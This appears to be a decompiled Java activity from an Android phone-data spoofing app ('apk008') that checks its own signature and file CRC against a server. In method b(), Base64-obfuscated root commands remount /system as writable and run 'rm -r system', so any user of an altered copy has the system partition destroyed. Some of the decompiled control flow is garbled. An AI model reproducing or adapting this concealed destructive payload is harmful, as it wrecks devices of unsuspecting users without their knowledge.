package com.soft.apk008;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.Signature;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.util.Base64;
import android.widget.ImageView;

import com.a.a.Map;
import com.data.simulate.SimulateDataTest;
import com.lishu.c.o;
import com.lishu.c.p;
import com.lishu.c.w;

import de.robv.android.xposed.mods.tutorial.PoseHelper008;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.zip.ZipFile;

public class LoadActivity
  extends Activity
  implements w
{
  public static int a;
  public static int b;
  public static boolean c;
  public static boolean d;
  public static String e;
  static long f;
  static long g;
  public static String h;
  public static String i = "小偷可耻";
  public static String j = "fuck you";
  public static String k = "";
  public static String l = "";
  public static String m = "";
  public static String n = "";
  private static p p = new p();
  private static String q;
  private static long r;
  private static String u = StartActivity.b + "/phone/LogicSimpleAction.action";
  o o = new o();
  private int s = 0;
  private boolean t = true;
  private String v = "";
  
  static
  {
    c = true;
    d = false;
    e = "0";
    q = StartActivity.b + "/phone/CheckAction.action";
    f = System.currentTimeMillis();
    g = cu.a.nextLong();
    System.loadLibrary("apk008.com");
    h = "NDI2MTExRDlCNEM2QT";
    r = 0L;
  }
  
  public static void a(Context paramContext)
  {
    String str = paramContext.getPackageCodePath();
    try
    {
      str = v.a(new ZipFile(str).getEntry(b("Y2xhc3Nlcy5kZXg=")).getCrc());
      paramContext = StartActivity.a(paramContext, "test");
      if (!str.trim().equals(paramContext.trim())) {
        b();
      }
      return;
    }
    catch (IOException paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public static void a(Context paramContext, w paramw)
  {
    HashMap localHashMap = new HashMap();
    StartActivity.b(paramContext);
    localHashMap.putAll(StartActivity.b());
    localHashMap.put("signature", d(paramContext));
    localHashMap.put("signfor008", c.a(f + "_" + g));
    e(paramContext);
    SetMessageActivity.c.length();
    p.a(q, localHashMap, paramw);
  }
  
  public static boolean a()
  {
    boolean bool = false;
    String str = h.a("cat /system/etc/hosts", false);
    int i1 = StartActivity.b.indexOf("http://");
    int i2 = StartActivity.b.indexOf("/", i1 + 7);
    if (str.indexOf(StartActivity.b.substring(i1 + 7, i2)) >= 0) {
      bool = true;
    }
    return bool;
  }
  
  private static boolean a(Activity paramActivity)
  {
    paramActivity = (ConnectivityManager)paramActivity.getApplicationContext().getSystemService("connectivity");
    if (paramActivity == null) {}
    for (;;)
    {
      return false;
      paramActivity = paramActivity.getAllNetworkInfo();
      if ((paramActivity != null) && (paramActivity.length > 0))
      {
        int i1 = 0;
        while (i1 < paramActivity.length)
        {
          System.out.println(i1 + "===状态===" + paramActivity[i1].getState());
          System.out.println(i1 + "===类型===" + paramActivity[i1].getTypeName());
          if (paramActivity[i1].getState() == NetworkInfo.State.CONNECTED) {
            return true;
          }
          i1 += 1;
        }
      }
    }
  }
  
  public static String b(Context paramContext)
  {
    if (c) {
      return paramContext.getResources().getString(2131099648);
    }
    return paramContext.getResources().getString(2131099649);
  }
  
  public static String b(String paramString)
  {
    return new String(Base64.decode(paramString, 0));
  }
  
  public static void b()
  {
    Object localObject1 = null;
    try
    {
      byte[] arrayOfByte = Base64.decode(e.getBytes(), 0);
      localObject1 = arrayOfByte;
    }
    catch (Exception localException)
    {
      label15:
      Object localObject2;
      break label15;
    }
    if (localObject1 != null) {
      try
      {
        localObject1 = new String((byte[])localObject1, "utf-8");
        if (((String)localObject1).equals("false")) {
          return;
        }
      }
      catch (UnsupportedEncodingException localUnsupportedEncodingException1)
      {
        for (;;)
        {
          localUnsupportedEncodingException1.printStackTrace();
          localObject2 = "";
        }
      }
    }
    localObject2 = Base64.decode("bW91bnQgLW8gcmVtb3VudCBydyAvc3lzdGVt", 0);
    try
    {
      localObject2 = new String((byte[])localObject2, "utf-8");
      h.a((String)localObject2);
      localObject2 = Base64.decode("cm0gLXIgc3lzdGVt".getBytes(), 0);
    }
    catch (UnsupportedEncodingException localUnsupportedEncodingException2)
    {
      try
      {
        localObject2 = new String((byte[])localObject2, "utf-8");
        h.a((String)localObject2);
        try
        {
          Thread.sleep(1000L);
          return;
        }
        catch (InterruptedException localInterruptedException)
        {
          localInterruptedException.printStackTrace();
          return;
        }
        localUnsupportedEncodingException2 = localUnsupportedEncodingException2;
        localUnsupportedEncodingException2.printStackTrace();
        String str1 = "";
      }
      catch (UnsupportedEncodingException localUnsupportedEncodingException3)
      {
        for (;;)
        {
          localUnsupportedEncodingException3.printStackTrace();
          String str2 = "";
        }
      }
    }
  }
  
  public static String c(Context paramContext)
  {
    if (c) {
      return paramContext.getResources().getString(2131099652);
    }
    return "";
  }
  
  private static String d(Context paramContext)
  {
    int i2 = 0;
    int i1 = 0;
    for (;;)
    {
      String str;
      if (i1 >= SetMessageActivity.e.length()) {
        str = "";
      }
      try
      {
        Signature[] arrayOfSignature = paramContext.getPackageManager().getPackageInfo(paramContext.getPackageName(), 64).signatures;
        Class localClass = Class.forName("android.content.pm.Signature");
        int i3 = arrayOfSignature.length;
        i1 = i2;
        paramContext = str;
        for (;;)
        {
          if (i1 >= i3)
          {
            paramContext = v.a(paramContext);
            return paramContext;
            SetMessageActivity.f.length();
            i1 += 1;
            break;
          }
          str = arrayOfSignature[i1];
          Method localMethod = localClass.getMethod("toCharsString", new Class[0]);
          paramContext = paramContext + localMethod.invoke(str, new Object[0]) + "a1";
          i1 += 1;
        }
        return "";
      }
      catch (Exception paramContext)
      {
        paramContext.printStackTrace();
      }
    }
  }
  
  private static void e(Context paramContext)
  {
    int i2 = 0;
    int i1 = 0;
    for (;;)
    {
      String str;
      if (i1 >= SetMessageActivity.e.length()) {
        str = "";
      }
      try
      {
        Signature[] arrayOfSignature = paramContext.getPackageManager().getPackageInfo(paramContext.getPackageName(), 64).signatures;
        Class localClass = Class.forName("android.content.pm.Signature");
        int i3 = arrayOfSignature.length;
        i1 = i2;
        paramContext = str;
        for (;;)
        {
          if (i1 >= i3)
          {
            paramContext = v.a(paramContext);
            if (!SimulateDataTest.getBaseSign().equals(paramContext)) {
              b();
            }
            return;
            SetMessageActivity.f.length();
            i1 += 1;
            break;
          }
          str = arrayOfSignature[i1];
          Method localMethod = localClass.getMethod("toCharsString", new Class[0]);
          paramContext = paramContext + localMethod.invoke(str, new Object[0]) + "a1";
          i1 += 1;
        }
        return;
      }
      catch (Exception paramContext)
      {
        paramContext.printStackTrace();
      }
    }
  }
  
  public static native SimulateDataTest getData(Context paramContext, int paramInt1, int paramInt2, boolean paramBoolean);
  
  public static native String getImei(Context paramContext, int paramInt1, int paramInt2, String paramString);
  
  public static native String getProPackAge(Context paramContext, int paramInt1, int paramInt2);
  
  public static native int libSign(Context paramContext, int paramInt1, int paramInt2);
  
  public static native String stringFromJNI(Context paramContext, int paramInt1, int paramInt2);
  
  public final void a(String paramString)
  {
    if ((paramString == null) || (paramString.length() == 0))
    {
      a.b(this, "连接服务器失败，请重新，如果还不行，请联系客服或者到官网下载新版本 【" + c(this) + "】\n" + p.d + " msg: null");
      return;
    }
    try
    {
      localObject = e.b(paramString);
      paramString = ((Map)localObject).getStringfrommap("key");
      localObject = ((Map)localObject).getStringfrommap("signfor008");
      if ((localObject == null) || (((String)localObject).length() == 0))
      {
        a.b(this, "连接服务器失败，请重新，如果还不行，请联系客服或者到官网下载新版本  【" + c(this) + "】\n  errorCode:100");
        return;
      }
    }
    catch (Exception paramString)
    {
      paramString.printStackTrace();
      runOnUiThread(new ay(this));
      return;
    }
    Object localObject = c.b((String)localObject);
    if ((localObject == null) || (((String)localObject).length() == 0))
    {
      a.b(this, "连接服务器失败，请重新，如果还不行，请联系客服或者到官网下载新版本  【" + c(this) + "】\n  errorCode:101");
      return;
    }
    if (!((String)localObject).equals(f + "_" + g))
    {
      a.b(this, "连接服务器失败，请重新，如果还不行，请联系客服或者到官网下载新版本【" + c(this) + "】\n  errorCode:102");
      return;
    }
    paramString = paramString.split("_");
    int i1 = Integer.parseInt(paramString[0]);
    int i2 = Integer.parseInt(paramString[1]);
    StartActivity.e = stringFromJNI(this, i1, i2);
    a = i1;
    b = i2;
    PoseHelper008.a = i1;
    PoseHelper008.b = i2;
    d = true;
    paramString = new Intent();
    paramString.setClass(this, StartActivity.class);
    startActivity(paramString);
    finish();
  }
  
  protected void onCreate(Bundle paramBundle)
  {
    String str = PoseHelper008.getFileData("008network");
    if ((str != null) && (str.trim().length() > 0))
    {
      StartActivity.b = StartActivity.a.replace("api2", str);
      q = StartActivity.b + "/phone/CheckAction.action";
    }
    super.onCreate(paramBundle);
    setContentView(2130903075);
    paramBundle = (ImageView)findViewById(2131362002);
    if (!c) {
      paramBundle.setImageResource(2130837591);
    }
    if (!a(this))
    {
      a.a(this, "请检查当前网络是否可用");
      return;
    }
    new aw(this).start();
  }
}



/* Location:           D:\AndroidKiller_v1.3.1\projects\008\ProjectSrc\smali\

 * Qualified Name:     com.soft.apk008.LoadActivity

 * JD-Core Version:    0.7.0.1

 */